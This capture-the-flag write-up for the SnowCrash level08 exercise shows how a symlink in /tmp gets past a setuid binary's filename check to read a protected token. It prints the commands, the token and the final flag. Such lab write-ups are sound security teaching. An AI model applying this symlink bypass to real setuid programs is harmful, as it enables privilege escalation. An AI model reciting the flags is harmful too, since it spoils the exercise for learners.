# level08

## Hint

There are two files at the root of our home:

```shell-session
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

`level08` is a binary that reads as follows when we launch it:

```shell-session
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

But launching it on our token file does nothing for us:

```shell-session
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Our goal is therefor to find a way to read the contents of the token file.

## symlink

To do that we should feed to the executable a path that will be resolved to the file we are trying to access.

```shell-session
level08@SnowCrash:~$ cd /tmp
level08@SnowCrash:/tmp$ ln -s ../home/user/level08/token getflag
level08@SnowCrash:~$ ./level08 /tmp/getflag
quif5eloekouj29ke0vouxean
```

Meaning:
When the shell evaluates `/tmp/getflag` the executable receives `../home/user/level08/token`.

```shell-session
level08@SnowCrash:~$ ls -l /tmp/getflag
lrwxrwxrwx 1 level08 level08 26 May  6 11:32 /tmp/getflag -> ../home/user/level08/token
```

# getflag

```shell-session
 λ Securite/snowcrash42/level08 ssh flag08@192.168.152.166 -p 4242            main :: 23h :: ⬡
	   _____                      _____               _
	  / ____|                    / ____|             | |
	 | (___  _ __   _____      _| |     _ __ __ _ ___| |__
	  \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \
	  ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
	 |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|

  Good luck & Have fun

          192.168.152.166 2a01:cb06:802f:11c0:69b1:d2eb:a6ed:facd 2a01:cb06:802f:11c0:a00:27ff:fef7:2e52
flag08@192.168.152.166's password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
